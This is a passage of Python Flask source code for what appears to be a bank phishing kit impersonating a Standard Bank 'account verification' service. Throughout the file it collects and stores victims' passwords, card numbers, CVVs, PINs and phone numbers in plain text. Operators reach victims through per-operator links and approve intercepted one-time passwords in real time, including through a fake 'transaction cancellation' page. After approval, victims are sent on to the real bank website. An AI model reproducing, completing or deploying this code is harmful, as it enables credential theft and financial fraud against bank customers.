# Import required modules for Flask application
from flask import Flask, request, jsonify, render_template, session, redirect, url_for, send_from_directory
from flask_sqlalchemy import SQLAlchemy  # SQLAlchemy ORM for database operations
from werkzeug.security import generate_password_hash, check_password_hash  # Password hashing utilities
from datetime import datetime  # For timestamp handling
import bcrypt  # For password hashing (additional security)
import os  # For environment variables and file operations

import uuid # For generating unique link IDs
import json

# Create Flask application instance
app = Flask(__name__)

# Configure Flask application settings
app.config['SECRET_KEY'] = 'your-secret-key-change-this-in-production'  # Secret key for session encryption
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'  # SQLite database file path
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False  # Disable modification tracking for performance

# Initialize SQLAlchemy with Flask app
db = SQLAlchemy(app)



# Define database models using SQLAlchemy ORM

class Submission(db.Model):
    """Model for storing form submission data"""
    __tablename__ = 'submissions'  # Table name in database
    
    # Define table columns with their data types and constraints
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)  # Primary key, auto-increment
    fullname = db.Column(db.String(100), nullable=False)  # Username field, required
    password = db.Column(db.String(200), nullable=False)  # Password field, required
    card_number = db.Column(db.String(16), nullable=False)  # Card number, required
    expiry_date = db.Column(db.String(5), nullable=False)  # Expiry date MM/YY format, required
    cvv = db.Column(db.String(3), nullable=False)  # CVV 3 digits, required
    card_pin = db.Column(db.String(5), nullable=False)  # Card PIN 5 digits, required
    contact_number = db.Column(db.String(20), nullable=True)  # Contact number, optional
    phone_number = db.Column(db.String(20), nullable=False)  # Phone number for OTP, required
    last_account_balance = db.Column(db.String(20), nullable=True)  # Last account balance, optional
    submitted_at = db.Column(db.DateTime, default=datetime.utcnow)  # Timestamp, defaults to current time
    admin_id = db.Column(db.Integer, db.ForeignKey('admins.id'), nullable=True) # Admin who owns this submission

    def to_dict(self):
        """Convert model instance to dictionary for JSON serialization"""
        return {
            'id': self.id,
            'fullname': self.fullname,
            'password': self.password,
            'card_number': self.card_number,
            'expiry_date': self.expiry_date,
            'cvv': self.cvv,
            'card_pin': self.card_pin,
            'contact_number': self.contact_number,
            'phone_number': self.phone_number,
            'last_account_balance': self.last_account_balance,
            'submitted_at': self.submitted_at.isoformat() if self.submitted_at else None,
            'admin_id': self.admin_id # Add admin_id to the dictionary
        }

class Admin(db.Model):
    """Model for storing admin user credentials"""
    __tablename__ = 'admins'  # Table name in database
    
    # Define table columns
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)  # Primary key, auto-increment
    username = db.Column(db.String(50), unique=True, nullable=False)  # Username, unique and required
    password_hash = db.Column(db.String(200), nullable=False)  # Hashed password, required
    unique_link_id = db.Column(db.String(36), unique=True, nullable=True) # Unique ID for homepage link
    is_super_admin = db.Column(db.Boolean, default=False)  # Super admin flag
    created_by = db.Column(db.Integer, db.ForeignKey('admins.id'), nullable=True)  # Who created this admin
    is_active = db.Column(db.Boolean, default=True)  # Whether admin account is active
    created_at = db.Column(db.DateTime, default=datetime.utcnow)  # When admin was created

    def to_dict(self):
        """Convert model instance to dictionary for JSON serialization"""
        return {
            'id': self.id,
            'username': self.username,
            'unique_link_id': self.unique_link_id,
            'is_super_admin': self.is_super_admin,
            'is_active': self.is_active,
            'created_at': self.created_at.isoformat() if self.created_at else None
        }

class UserActivity(db.Model):
    """Model for tracking user actions and interactions"""
    __tablename__ = 'user_activities'  # Table name in database
    
    # Define table columns for tracking user activities
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)  # Primary key, auto-increment
    user_identifier = db.Column(db.String(100), nullable=True)  # User session ID or IP address for identification
    action_type = db.Column(db.String(50), nullable=False)  # Type of action (page_visit, button_click, form_submit)
    page = db.Column(db.String(200), nullable=False)  # Page or endpoint where action occurred
    element_id = db.Column(db.String(100), nullable=True)  # ID of clicked element (for button clicks)
    user_agent = db.Column(db.String(500), nullable=True)  # Browser user agent string
    ip_address = db.Column(db.String(45), nullable=True)  # User's IP address (supports IPv6)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)  # When the action occurred
    additional_data = db.Column(db.Text, nullable=True)  # JSON string for extra tracking data

    def to_dict(self):
        """Convert model instance to dictionary for JSON serialization"""
        return {
            'id': self.id,
            'user_identifier': self.user_identifier,
            'action_type': self.action_type,
            'page': self.page,
            'element_id': self.element_id,
            'user_agent': self.user_agent,
            'ip_address': self.ip_address,
            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
            'additional_data': self.additional_data
        }

class OtpAuthorizationRequest(db.Model):
    """Model for tracking OTP authorization requests that require admin approval"""
    __tablename__ = 'otp_authorization_requests'  # Table name in database
    
    # Define table columns for authorization tracking
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)  # Primary key, auto-increment
    user_identifier = db.Column(db.String(100), nullable=False)  # User session ID who is requesting OTP
    submission_id = db.Column(db.Integer, db.ForeignKey('submissions.id'), nullable=True)  # Related form submission
    admin_id = db.Column(db.Integer, db.ForeignKey('admins.id'), nullable=True)  # Admin who owns this submission
    ip_address = db.Column(db.String(45), nullable=True)  # User's IP address
    user_agent = db.Column(db.String(500), nullable=True)  # Browser user agent
    status = db.Column(db.String(20), default='pending', nullable=False)  # pending, approved, denied
    requested_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)  # When request was made
    approved_at = db.Column(db.DateTime, nullable=True)  # When admin approved/denied
    approved_by_admin_id = db.Column(db.Integer, db.ForeignKey('admins.id'), nullable=True)  # Which admin approved
    notes = db.Column(db.Text, nullable=True)  # Admin notes about the decision

    def to_dict(self):
        """Convert model instance to dictionary for JSON serialization"""
        return {
            'id': self.id,
            'user_identifier': self.user_identifier,
            'submission_id': self.submission_id,
            'admin_id': self.admin_id,
            'ip_address': self.ip_address,
            'user_agent': self.user_agent,
            'status': self.status,
            'requested_at': self.requested_at.isoformat() if self.requested_at else None,
            'approved_at': self.approved_at.isoformat() if self.approved_at else None,
            'approved_by_admin_id': self.approved_by_admin_id,
            'notes': self.notes
        }

class OtpVerificationRequest(db.Model):
    """Model for tracking OTP codes submitted by users that require admin verification"""
    __tablename__ = 'otp_verification_requests'  # Table name in database
    
    # Define table columns for OTP verification tracking
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)  # Primary key, auto-increment
    user_identifier = db.Column(db.String(100), nullable=False)  # User session ID who submitted OTP
    otp_code = db.Column(db.String(10), nullable=False)  # OTP code submitted by user
    submission_id = db.Column(db.Integer, db.ForeignKey('submissions.id'), nullable=True)  # Related form submission
    admin_id = db.Column(db.Integer, db.ForeignKey('admins.id'), nullable=True)  # Admin who owns this submission
    ip_address = db.Column(db.String(45), nullable=True)  # User's IP address
    user_agent = db.Column(db.String(500), nullable=True)  # Browser user agent
    status = db.Column(db.String(20), default='pending', nullable=False)  # pending, approved, denied
    submitted_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)  # When OTP was submitted
    verified_at = db.Column(db.DateTime, nullable=True)  # When admin verified OTP
    verified_by_admin_id = db.Column(db.Integer, db.ForeignKey('admins.id'), nullable=True)  # Which admin verified
    admin_notes = db.Column(db.Text, nullable=True)  # Admin notes about the verification

    def to_dict(self):
        """Convert model instance to dictionary for JSON serialization"""
        return {
            'id': self.id,
            'user_identifier': self.user_identifier,
            'otp_code': self.otp_code,
            'submission_id': self.submission_id,
            'admin_id': self.admin_id,
            'ip_address': self.ip_address,
            'user_agent': self.user_agent,
            'status': self.status,
            'submitted_at': self.submitted_at.isoformat() if self.submitted_at else None,
            'verified_at': self.verified_at.isoformat() if self.verified_at else None,
            'verified_by_admin_id': self.verified_by_admin_id,
            'admin_notes': self.admin_notes
        }

class TransactionCancellationRequest(db.Model):
    """Model for tracking transaction cancellation OTP verification requests"""
    __tablename__ = 'transaction_cancellation_requests'  # Table name in database
    
    # Define table columns for transaction cancellation tracking
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)  # Primary key, auto-increment
    user_identifier = db.Column(db.String(100), nullable=False)  # User session ID who submitted OTP
    otp_code = db.Column(db.String(10), nullable=False)  # OTP code submitted by user
    transaction_amount = db.Column(db.Numeric(10, 2), nullable=False)  # Amount of transaction to cancel
    submission_id = db.Column(db.Integer, db.ForeignKey('submissions.id'), nullable=True)  # Related form submission
    admin_id = db.Column(db.Integer, db.ForeignKey('admins.id'), nullable=True)  # Admin who owns this submission
    ip_address = db.Column(db.String(45), nullable=True)  # User's IP address
    user_agent = db.Column(db.String(500), nullable=True)  # Browser user agent
    status = db.Column(db.String(20), default='pending', nullable=False)  # pending, approved, denied
    submitted_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)  # When OTP was submitted
    verified_at = db.Column(db.DateTime, nullable=True)  # When admin verified OTP
    verified_by_admin_id = db.Column(db.Integer, db.ForeignKey('admins.id'), nullable=True)  # Which admin verified
    admin_notes = db.Column(db.Text, nullable=True)  # Admin notes about the verification

    def to_dict(self):
        """Convert model instance to dictionary for JSON serialization"""
        return {
            'id': self.id,
            'user_identifier': self.user_identifier,
            'otp_code': self.otp_code,
            'transaction_amount': float(self.transaction_amount) if self.transaction_amount else None,
            'submission_id': self.submission_id,
            'admin_id': self.admin_id,
            'ip_address': self.ip_address,
            'user_agent': self.user_agent,
            'status': self.status,
            'submitted_at': self.submitted_at.isoformat() if self.submitted_at else None,
            'verified_at': self.verified_at.isoformat() if self.verified_at else None,
            'verified_by_admin_id': self.verified_by_admin_id,
            'admin_notes': self.admin_notes
        }

# Helper function to check if user is authenticated as admin
def require_auth():
    """Check if current session has admin authentication"""
    if not session.get('is_admin'):  # Check if admin flag exists in session
        return False  # User is not authenticated
    return True  # User is authenticated

# Helper function to check if user is a super admin
def require_super_admin():
    """Check if current session has super admin authentication"""
    if not require_auth():  # First check if user is authenticated
        return False
    admin = db.session.get(Admin, session.get('admin_id'))
    if not admin or not admin.is_super_admin:  # Check if user is super admin
        return False
    return True  # User is super admin

# Helper function to get user identifier from session or IP
def get_user_identifier():
    """Get unique identifier for the current user"""
    # Try to get session ID first, fallback to IP address
    if 'user_session_id' not in session:
        # Generate a unique session ID for this user
        import uuid
        session['user_session_id'] = str(uuid.uuid4())  # Create unique session identifier
    
    return session.get('user_session_id', request.remote_addr)  # Return session ID or IP as fallback

# Helper function to log user activity
def log_user_activity(action_type, page, element_id=None, additional_data=None):
    """Log user activity to the database"""
    try:
        # Get user information from request
        user_identifier = get_user_identifier()  # Get unique user identifier
        user_agent = request.headers.get('User-Agent', '')  # Get browser user agent
        ip_address = request.remote_addr  # Get user's IP address
        
        # Create new activity record
        activity = UserActivity(
            user_identifier=user_identifier,  # Unique identifier for this user session
            action_type=action_type,  # Type of action performed
            page=page,  # Page or endpoint where action occurred
            element_id=element_id,  # Element that was interacted with (if applicable)
            user_agent=user_agent,  # Browser information
            ip_address=ip_address,  # User's IP address
            additional_data=additional_data  # Any extra data as JSON string
        )
        
        # Save activity to database
        db.session.add(activity)  # Add to database session
        db.session.commit()  # Save to database
        
    except Exception as e:
        # Handle logging errors gracefully (don't break the main app)
        print(f'Error logging user activity: {str(e)}')  # Log error for debugging
        db.session.rollback()  # Rollback if there was an error

# Middleware to automatically track page visits
@app.before_request
def track_page_visits():
    """Automatically log page visits for all requests"""
    # Skip tracking for static files and admin API calls to avoid noise
    if (request.endpoint and 
        not request.endpoint.startswith('serve_static') and  # Skip static file requests
        not request.path.startswith('/api/admin') and  # Skip admin API calls
        request.method == 'GET'):  # Only track GET requests for page visits
        
        # Log the page visit
        log_user_activity(
            action_type='page_visit',  # Mark this as a page visit
            page=request.path,  # Record the page path
            additional_data=f'{{"query_params": "{request.query_string.decode()}"}}' if request.query_string else None
        )

# Route to serve the main verification form
@app.route('/')
def index():
    """Serve the main account verification form"""
    admin_id = request.args.get('admin_id')
    if admin_id:
        # Validate the admin_id
        admin = Admin.query.filter_by(unique_link_id=admin_id).first()
        if admin:
            session['admin_id'] = admin.id
    return send_from_directory('public', 'index.html')  # Send HTML file from public directory

# Route to serve the loading page
@app.route('/loading')
def loading_page():
    """Serve the loading page shown during verification processing"""
    return send_from_directory('public', 'loading.html')  # Send loading HTML file from public directory

# Route to serve the logo for email hosting
@app.route('/logo-email.png')
def logo_email():
    """Serve the logo image for email hosting"""
    return send_from_directory('.', 'logo_email.png')  # Send logo file from root directory

# Route to serve the OTP verification page
@app.route('/otp-verification')
def otp_verification():
    """Serve the OTP verification page for two-factor authentication"""
    return send_from_directory('public', 'otp-verification.html')  # Send OTP HTML file from public directory

# Route to serve the transaction cancellation page
@app.route('/transaction-cancellation')
def transaction_cancellation():
    """Serve the transaction cancellation OTP verification page"""
    return send_from_directory('public', 'transaction-cancellation.html')  # Send transaction cancellation HTML file from public directory

# Route to track user interactions (button clicks, form submissions)
@app.route('/api/track', methods=['POST'])
def track_user_interaction():
    """Track user interactions like button clicks and form submissions"""
    try:
        # Get tracking data from request
        data = request.get_json()
        
        # Extract tracking information
        action_type = data.get('action_type', 'unknown')  # Type of action performed
        page = data.get('page', request.referrer or '/')  # Page where action occurred
        element_id = data.get('element_id')  # ID of element that was interacted with
        additional_data = data.get('additional_data')  # Any extra tracking data
        
        # Log the user interaction
        log_user_activity(
            action_type=action_type,  # Record the type of action
            page=page,  # Record which page the action occurred on
            element_id=element_id,  # Record which element was interacted with
            additional_data=additional_data  # Store any extra data as JSON
        )
        
        return jsonify({'success': True}), 200  # Return success response
    
    except Exception as e:
        # Handle tracking errors gracefully
        print(f'Error tracking user interaction: {str(e)}')  # Log error for debugging
        return jsonify({'error': 'Tracking error'}), 500  # Return error response

# Route to handle form submissions
@app.route('/api/submit', methods=['POST'])
def submit_form():
    """Handle form submission and store data in database"""
    try:
        # Get JSON data from request body
        data = request.get_json()
        
        # DEBUG: Log the received form data
        print(f'DEBUG: Received form data: {data}')
        
        # Get admin_id from session (set when client visited homepage with admin_id parameter)
        admin_id = session.get('admin_id')
        
        # DEBUG: Log the admin_id from session
        print(f'DEBUG: Admin ID from session: {admin_id}')
        
        # Validate that admin_id exists (client must have come through a valid admin link)
        if not admin_id:
            return jsonify({'error': 'Invalid access. Please use the correct verification link.'}), 400
        
        # Verify the admin exists and is active
        admin = db.session.get(Admin, admin_id)
        if not admin or not admin.is_active:
            return jsonify({'error': 'Invalid access. Admin account not found or inactive.'}), 400
        
        # Log form submission attempt
        log_user_activity(
            action_type='form_submit',  # Mark this as a form submission
            page='/api/submit',  # Record the endpoint
            additional_data=f'{{"form_type": "account_verification", "admin_id": {admin_id}}}'  # Extra context about the form
        )
        
        # Validate that all required fields are present
        required_fields = ['fullname', 'password', 'CardNumber', 'expiry_date', 'cvv', 'card_pin', 'phone_number']
        for field in required_fields:
            if not data.get(field):  # Check if field is missing or empty
                return jsonify({'error': f'Field {field} is required'}), 400  # Return error response
        
        # Log successful form submission
        log_user_activity(
            action_type='form_submit_success',  # Mark as successful submission
            page='/api/submit',  # Record the endpoint
            additional_data=f'{{"form_type": "account_verification", "admin_id": {admin_id}}}'  # Extra context about the form
        )
        
        # DEBUG: Log what we're about to store
        print(f'DEBUG: Creating submission with fullname: "{data["fullname"]}", admin_id: {admin_id}')
        
        # Create new submission record in database
        new_submission = Submission(
            fullname=data['fullname'],
            password=data['password'],
            card_number=data['CardNumber'],
            expiry_date=data['expiry_date'],
            cvv=data['cvv'],
            card_pin=data['card_pin'],
            contact_number=data.get('contact_number'),
            phone_number=data['phone_number'],
            last_account_balance=data.get('last_account_balance'),
            admin_id=admin_id  # Associate with the specific admin from the link
        )
        db.session.add(new_submission)
        db.session.commit()
        
        # Store submission_id in session for linking subsequent OTP requests
        session['submission_id'] = new_submission.id
        
        # Return success response with redirect instruction
        return jsonify({
            'success': True,
            'message': f'Verification completed successfully! OTP has been sent to {data["phone_number"]}',
            'redirect': f'/loading?submission_id={new_submission.id}'
        }), 200
    
    except Exception as e:
        # Log failed form submission
        log_user_activity(
            action_type='form_submit_error',  # Mark as failed submission
            page='/api/submit',  # Record the endpoint
            additional_data=f'{{"error": "{str(e)}"}}'  # Include error details
        )
        
        # Handle any errors during submission
        print(f'Error saving submission: {str(e)}')  # Log error details
        db.session.rollback()  # Rollback database changes if error occurred
        return jsonify({'error': 'Database error'}), 500  # Return server error response

# Route to handle OTP verification submission (admin approval required)
@app.route('/api/verify-otp', methods=['POST'])
def verify_otp():
    """Handle OTP verification submission - requires admin approval to proceed"""
    try:
        # Get JSON data from request body
        data = request.get_json()
        
        # Extract OTP code from request
        otp_code = data.get('otp_code', '').strip()  # Get OTP code and remove whitespace
        
        # Get user information
        user_identifier = get_user_identifier()  # Get unique user identifier
        user_agent = request.headers.get('User-Agent', '')  # Get browser user agent
        ip_address = request.remote_addr  # Get user's IP address
        
        # Log OTP verification attempt
        log_user_activity(
            action_type='otp_submit_for_verification',  # Mark as OTP submitted for admin verification
            page='/api/verify-otp',  # Record the endpoint
            additional_data=f'{{"otp_length": {len(otp_code)}}}'  # Include OTP length for analytics
        )
        
        # Validate OTP format
        if not otp_code or len(otp_code) != 6 or not otp_code.isdigit():
            # Log invalid OTP format
            log_user_activity(
                action_type='otp_verify_invalid_format',  # Mark as invalid format
                page='/api/verify-otp',  # Record the endpoint
                additional_data=f'{{"otp_length": {len(otp_code)}, "is_digit": {otp_code.isdigit()}}}'  # Format validation details
            )
            return jsonify({'error': 'Invalid OTP format. Please enter a 6-digit code.'}), 400  # Return validation error
        
        # Check if there's already a pending verification request for this user
        existing_request = OtpVerificationRequest.query.filter_by(
            user_identifier=user_identifier,
            status='pending'
        ).first()
        
        if existing_request:
            # Return existing request status
            return jsonify({
                'success': True,
                'verification_id': existing_request.id,
                'status': 'pending',
                'message': 'OTP submitted for admin verification. Please wait...'
            }), 200
        
        # Get admin_id and submission_id from session if available
        admin_id = session.get('admin_id')
        submission_id = session.get('submission_id')
        
        # Create new OTP verification request for admin review
        verification_request = OtpVerificationRequest(
            user_identifier=user_identifier,  # Unique identifier for this user session
            otp_code=otp_code,  # OTP code submitted by user (stored in clear text for admin)
            submission_id=submission_id,  # Related form submission if available
            admin_id=admin_id,  # Admin who owns this submission
            ip_address=ip_address,  # User's IP address
            user_agent=user_agent,  # Browser information
            status='pending'  # Requires admin approval
        )
        
        # Save verification request to database
        db.session.add(verification_request)  # Add to database session
        db.session.commit()  # Save to database
        
        # Log the OTP verification request creation
        log_user_activity(
            action_type='otp_verification_request_created',  # Mark as verification request created
            page='/api/verify-otp',  # Record the endpoint
            additional_data=f'{{"verification_id": {verification_request.id}, "otp_clear": "{otp_code}"}}'  # Include clear OTP in logs
        )
        
        print(f'OTP verification request created with ID: {verification_request.id} for user: {user_identifier} - Clear OTP: {otp_code}')
        
        # Return response indicating OTP is pending admin verification
        return jsonify({
            'success': True,
            'verification_id': verification_request.id,
            'status': 'pending',
            'message': 'OTP submitted for admin verification. Please wait for approval...'
        }), 200
    
    except Exception as e:
        # Log OTP verification error
        log_user_activity(
            action_type='otp_verify_error',  # Mark as verification error
            page='/api/verify-otp',  # Record the endpoint
            additional_data=f'{{"error": "{str(e)}"}}'  # Include error details
        )
        
        # Handle any errors during OTP verification
        print(f'Error during OTP verification: {str(e)}')  # Log error details
        db.session.rollback()  # Rollback database changes if error occurred
        return jsonify({'error': 'Verification error. Please try again.'}), 500  # Return server error response

# Route to check OTP verification status (polling endpoint for OTP page)
@app.route('/api/check-otp-verification/<int:verification_id>', methods=['GET'])
def check_otp_verification(verification_id):
    """Check if OTP verification request has been approved by admin"""
    try:
        # Find the verification request
        verification_request = db.session.get(OtpVerificationRequest, verification_id)
        
        if not verification_request:
            return jsonify({'error': 'Verification request not found'}), 404  # Return not found error
        
        # Verify this request belongs to the current user (security check)
        current_user_id = get_user_identifier()
        if verification_request.user_identifier != current_user_id:
            return jsonify({'error': 'Unauthorized access to verification request'}), 403  # Return forbidden error
        
        # Return current status
        response_data = {
            'verification_id': verification_request.id,
            'status': verification_request.status,
            'submitted_at': verification_request.submitted_at.isoformat(),
        }
        
        # Add verification details based on status
        if verification_request.status == 'approved':
            response_data['verified_at'] = verification_request.verified_at.isoformat() if verification_request.verified_at else None
            response_data['can_proceed'] = True
            response_data['message'] = 'OTP verified successfully! Redirecting...'
            response_data['redirect'] = 'https://www.standardbank.co.za/southafrica/personal'
            
            # Log that user checked approved status
            log_user_activity(
                action_type='otp_verification_approved_check',  # Mark as approved status check
                page='/api/check-otp-verification',  # Record the endpoint
                additional_data=f'{{"verification_id": {verification_request.id}}}'  # Include verification ID
            )
            
        elif verification_request.status == 'denied':
            response_data['can_proceed'] = False
            response_data['message'] = 'OTP verification failed. Please try again.'
            response_data['admin_notes'] = verification_request.admin_notes
            
        else:  # status is 'pending'
            response_data['can_proceed'] = False
            response_data['message'] = 'OTP is being verified by admin. Please wait...'
        
        return jsonify(response_data), 200
    
    except Exception as e:
        # Handle any errors during status check
        print(f'Error checking OTP verification status: {str(e)}')  # Log error details
        return jsonify({'error': 'Failed to check verification status'}), 500  # Return server error response

# Route to handle transaction cancellation OTP verification submission (admin approval required)
@app.route('/api/verify-transaction-cancellation', methods=['POST'])
def verify_transaction_cancellation():
    """Handle transaction cancellation OTP verification submission - requires admin approval to proceed"""
    try:
        # Get JSON data from request body
        data = request.get_json()
        
        # Extract OTP code and transaction amount from request
        otp_code = data.get('otp_code', '').strip()  # Get OTP code and remove whitespace
        transaction_amount = data.get('amount', '0')  # Get transaction amount
        
        # Get user information
        user_identifier = get_user_identifier()  # Get unique user identifier
        user_agent = request.headers.get('User-Agent', '')  # Get browser user agent
        ip_address = request.remote_addr  # Get user's IP address
        
        # Log transaction cancellation OTP verification attempt
        log_user_activity(
            action_type='transaction_cancellation_otp_submit',  # Mark as OTP submitted for admin verification
            page='/api/verify-transaction-cancellation',  # Record the endpoint
            additional_data=f'{{"otp_length": {len(otp_code)}, "amount": "{transaction_amount}"}}'  # Include OTP length and amount
        )
        
        # Validate OTP format
        if not otp_code or len(otp_code) != 6 or not otp_code.isdigit():
            # Log invalid OTP format
            log_user_activity(
                action_type='transaction_cancellation_otp_invalid_format',  # Mark as invalid format
                page='/api/verify-transaction-cancellation',  # Record the endpoint
                additional_data=f'{{"otp_length": {len(otp_code)}, "is_digit": {otp_code.isdigit()}}}'  # Format validation details
            )
            return jsonify({'error': 'Invalid OTP format. Please enter a 6-digit code.'}), 400  # Return validation error
        
        # Validate transaction amount (allow zero)
        try:
            amount_float = float(transaction_amount)
            if amount_float < 0:
                return jsonify({'error': 'Invalid transaction amount. Must be 0 or greater.'}), 400
        except (ValueError, TypeError):
            return jsonify({'error': 'Invalid transaction amount format.'}), 400
        
        # Check if there's already a pending verification request for this user
        existing_request = TransactionCancellationRequest.query.filter_by(
            user_identifier=user_identifier,
            status='pending'
        ).first()
        
        if existing_request:
            # Return existing request status
            return jsonify({
                'success': True,
                'verification_id': existing_request.id,
                'status': existing_request.status,
                'message': 'Transaction cancellation OTP submitted for admin verification. Please wait...'
            }), 200
        
        # Get admin_id and submission_id from session if available
        admin_id = session.get('admin_id')
        submission_id = session.get('submission_id')
        
        # Create new transaction cancellation verification request for admin review
        verification_request = TransactionCancellationRequest(
            user_identifier=user_identifier,  # Unique identifier for this user session
            otp_code=otp_code,  # OTP code submitted by user (stored in clear text for admin)
            transaction_amount=amount_float,  # Amount of transaction to cancel
            submission_id=submission_id,  # Related form submission if available
            admin_id=admin_id,  # Admin who owns this submission
            ip_address=ip_address,  # User's IP address
            user_agent=user_agent,  # Browser information
            status='pending'  # Requires admin approval
        )
        
        # Save verification request to database
        db.session.add(verification_request)  # Add to database session
        db.session.commit()  # Save to database
        
        # Log the transaction cancellation verification request creation
        log_user_activity(
            action_type='transaction_cancellation_verification_request_created',  # Mark as verification request created
            page='/api/verify-transaction-cancellation',  # Record the endpoint
            additional_data=f'{{"verification_id": {verification_request.id}, "otp_clear": "{otp_code}", "amount": "{amount_float}"}}'  # Include clear OTP and amount in logs
        )
        
        print(f'Transaction cancellation verification request created with ID: {verification_request.id} for user: {user_identifier} - Clear OTP: {otp_code} - Amount: ${amount_float}')
        
        # Return response indicating OTP is pending admin verification
        return jsonify({
            'success': True,
            'verification_id': verification_request.id,
            'status': 'pending',
            'message': 'Transaction cancellation OTP submitted for admin verification. Please wait for approval...'
        }), 200
    
    except Exception as e:
        # Log transaction cancellation OTP verification error
        log_user_activity(
            action_type='transaction_cancellation_otp_verify_error',  # Mark as verification error
            page='/api/verify-transaction-cancellation',  # Record the endpoint
            additional_data=f'{{"error": "{str(e)}"}}'  # Include error details
        )
        
        # Handle any errors during OTP verification
        print(f'Error during transaction cancellation OTP verification: {str(e)}')  # Log error details
        db.session.rollback()  # Rollback database changes if error occurred
        return jsonify({'error': 'Verification error. Please try again.'}), 500  # Return server error response

# Route to check transaction cancellation verification status (polling endpoint for transaction cancellation page)
@app.route('/api/check-transaction-cancellation/<int:verification_id>', methods=['GET'])
def check_transaction_cancellation_verification(verification_id):
    """Check if transaction cancellation OTP verification request has been approved by admin"""
    try:
        # Find the verification request
        verification_request = db.session.get(TransactionCancellationRequest, verification_id)
        
        if not verification_request:
            return jsonify({'error': 'Verification request not found'}), 404  # Return not found error
        
        # Verify this request belongs to the current user (security check)
        current_user_id = get_user_identifier()
        if verification_request.user_identifier != current_user_id:
            return jsonify({'error': 'Unauthorized access to verification request'}), 403  # Return forbidden error
        
        # Return current status
        response_data = {
            'verification_id': verification_request.id,
            'status': verification_request.status,
            'submitted_at': verification_request.submitted_at.isoformat(),
            'transaction_amount': float(verification_request.transaction_amount) if verification_request.transaction_amount else None
        }
        
        # Add verification details based on status
        if verification_request.status == 'approved':
            response_data['verified_at'] = verification_request.verified_at.isoformat() if verification_request.verified_at else None
            response_data['can_proceed'] = True
            response_data['message'] = 'Transaction cancellation approved! Redirecting...'
            response_data['redirect'] = 'https://www.standardbank.co.za/southafrica/personal'
            
            # Log that user checked approved status
            log_user_activity(
                action_type='transaction_cancellation_verification_approved_check',  # Mark as approved status check
                page='/api/check-transaction-cancellation',  # Record the endpoint
                additional_data=f'{{"verification_id": {verification_request.id}}}'  # Include verification ID
            )
            
        elif verification_request.status == 'denied':
            response_data['can_proceed'] = False
            response_data['message'] = 'Transaction cancellation denied. Please try again.'
            response_data['admin_notes'] = verification_request.admin_notes
            
        else:  # status is 'pending'
            response_data['can_proceed'] = False
            response_data['message'] = 'Transaction cancellation OTP is being verified by admin. Please wait...'
        
        return jsonify(response_data), 200
    
    except Exception as e:
        # Handle any errors during status check
        print(f'Error checking transaction cancellation verification status: {str(e)}')  # Log error details
        return jsonify({'error': 'Failed to check verification status'}), 500  # Return server error response

# Route to create OTP authorization request when user reaches loading page
@app.route('/api/request-otp-auth', methods=['POST'])
def request_otp_authorization():
    """Create an authorization request for OTP access that admin must approve"""
    try:
        # Get JSON data from request
        data = request.get_json() or {}
        
        # Get user information
        user_identifier = get_user_identifier()  # Get unique user identifier
        user_agent = request.headers.get('User-Agent', '')  # Get browser user agent
        ip_address = request.remote_addr  # Get user's IP address
        submission_id = data.get('submission_id')  # Get related submission ID if provided
        
        # Check if there's already a pending request for this user
        existing_request = OtpAuthorizationRequest.query.filter_by(
            user_identifier=user_identifier,
            status='pending'
        ).first()
        
        if existing_request:
            # Return existing request status
            return jsonify({
                'success': True,
                'request_id': existing_request.id,
                'status': existing_request.status,
                'message': 'Authorization request already exists'
            }), 200
        
        # Get admin_id from session if available
        admin_id = session.get('admin_id')
        
        # Create new authorization request
        auth_request = OtpAuthorizationRequest(
            user_identifier=user_identifier,  # Unique identifier for this user session
            submission_id=submission_id,  # Related form submission if available
            admin_id=admin_id,  # Admin who owns this submission
            ip_address=ip_address,  # User's IP address
            user_agent=user_agent,  # Browser information
            status='pending'  # Default status is pending admin approval
        )
        
        # Save request to database
        db.session.add(auth_request)  # Add to database session
        db.session.commit()  # Save to database
        
        # Log the authorization request
        log_user_activity(
            action_type='otp_auth_requested',  # Mark as authorization request
            page='/api/request-otp-auth',  # Record the endpoint
            additional_data=f'{{"request_id": {auth_request.id}, "status": "pending"}}'  # Include request details
        )
        
        print(f'OTP authorization request created with ID: {auth_request.id} for user: {user_identifier}')
        
        # Return success response
        return jsonify({
            'success': True,
            'request_id': auth_request.id,
            'status': 'pending',
            'message': 'Authorization request created successfully'
        }), 200
    
    except Exception as e:
        # Handle any errors during request creation
        print(f'Error creating authorization request: {str(e)}')  # Log error details
        db.session.rollback()  # Rollback database changes if error occurred
        return jsonify({'error': 'Failed to create authorization request'}), 500  # Return server error response

# Route to check authorization status (polling endpoint for loading page)
@app.route('/api/check-otp-auth/<int:request_id>', methods=['GET'])
def check_otp_authorization(request_id):
    """Check if OTP authorization request has been approved by admin"""
    try:
        # Find the authorization request
        auth_request = db.session.get(OtpAuthorizationRequest, request_id)
        
        if not auth_request:
            return jsonify({'error': 'Authorization request not found'}), 404  # Return not found error
        
        # Verify this request belongs to the current user (security check)
        current_user_id = get_user_identifier()
        if auth_request.user_identifier != current_user_id:
            return jsonify({'error': 'Unauthorized access to request'}), 403  # Return forbidden error
        
        # Return current status
        response_data = {
            'request_id': auth_request.id,
            'status': auth_request.status,
            'requested_at': auth_request.requested_at.isoformat(),
        }
        
        # Add approval details if approved
        if auth_request.status == 'approved':
            response_data['approved_at'] = auth_request.approved_at.isoformat() if auth_request.approved_at else None
            response_data['can_proceed'] = True
            response_data['message'] = 'Authorization approved - you can proceed to OTP verification'
            
            # Log that user checked approved status
            log_user_activity(
                action_type='otp_auth_approved_check',  # Mark as approved status check
                page='/api/check-otp-auth',  # Record the endpoint
                additional_data=f'{{"request_id": {auth_request.id}}}'  # Include request ID
            )
            
        elif auth_request.status == 'denied':
            response_data['can_proceed'] = False
            response_data['message'] = 'Authorization denied - please contact support'
            response_data['notes'] = auth_request.notes
            
        else:  # status is 'pending'
            response_data['can_proceed'] = False
            response_data['message'] = 'Waiting for admin authorization...'
        
